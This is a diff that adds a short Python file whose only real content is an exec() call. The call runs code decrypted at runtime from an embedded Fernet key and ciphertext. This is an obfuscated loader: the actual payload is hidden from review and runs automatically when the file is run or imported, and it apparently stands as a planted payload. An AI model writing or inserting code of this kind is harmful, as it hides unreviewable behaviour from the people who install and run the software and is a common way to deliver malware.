@@ -1,0 +1,5 @@
+
+import base64
+from cryptography.fernet import Fernet
+
+exec(Fernet(b'LD8_ItClWn4fUAPgTNKoDjjWCC744j6YA1A2zwMkoIE=').decrypt(b'gAAAAABoRA8WIJIht7bjX4fThNvj_JFNfotpWjOjv5F1pGRNx54ge_p8_QXbTEmIQto1cfGB7KQ3MubD6ExpsfzaFwThvmJPfrzmQl68n75drYFaNrEYWGFJaiJ00ykSb97T9CiLRgTUEag0yRGk1ZADCLMfiOqHtk84yNfLqmT9pUCAd5CJEDuHJW22t-LUs7MLSPDq12RcyUgyW__wsEhzhIwmRwQCCRuMlRhE-FZNlBtJeGxu3hw=').decode())
